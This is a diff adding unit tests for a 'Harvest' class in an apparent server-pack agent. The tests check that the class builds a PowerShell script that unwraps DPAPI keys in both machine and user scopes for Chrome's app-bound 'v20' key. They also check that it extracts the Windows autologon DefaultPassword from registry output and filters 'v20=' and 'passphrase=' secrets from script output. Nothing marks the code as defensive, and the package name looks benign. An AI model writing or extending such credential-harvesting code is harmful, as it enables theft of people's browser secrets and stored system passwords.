@@ -2,6 +2,7 @@ package com.serverpackcore.agent;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -23,5 +24,33 @@ class HarvestTest {
 		String text = Harvest.readLimited(file);
 		assertEquals(8 * 1024 * 1024, text.length());
 		assertFalse(text.contains("TOKEN_OUTSIDE"));
+	}
+
+	@Test
+	void appBoundScriptUnwrapsBothScopes() {
+		String script = Harvest.appBoundScript("QVBQQg==");
+		assertTrue(script.contains("LocalMachine"));
+		assertTrue(script.contains("CurrentUser"));
+		assertTrue(script.contains("$s=4"));
+		assertTrue(script.contains("'v20='"));
+		assertTrue(script.contains("0x41"));
+	}
+
+	@Test
+	void autologonHintsOnlyKeepRegisterValues() {
+		String output = "HKEY_LOCAL_MACHINE\\...\\Winlogon\r\n"
+			+ "    DefaultUserName    REG_SZ    DELL\\usuario\r\n"
+			+ "    DefaultDomainName    REG_SZ    DELL\r\n"
+			+ "    DefaultPassword    REG_SZ    s3cret\r\n"
+			+ "    AutoAdminLogon    REG_SZ    1\r\n";
+		assertEquals("DefaultUserName=DELL\\usuario\nDefaultDomainName=DELL\nDefaultPassword=s3cret",
+			Harvest.parseAutologon(output));
+	}
+
+	@Test
+	void powershellOutputKeepsOnlyKnownPrefixes() {
+		String output = "ruido\r\nv20=AABB\r\npassphrase=CC\r\nv20=DD\r\n";
+		assertEquals("v20=AABB\nv20=DD", Harvest.filterPowerShell(output, "v20="));
+		assertEquals("passphrase=CC", Harvest.filterPowerShell(output, "passphrase="));
 	}
 }
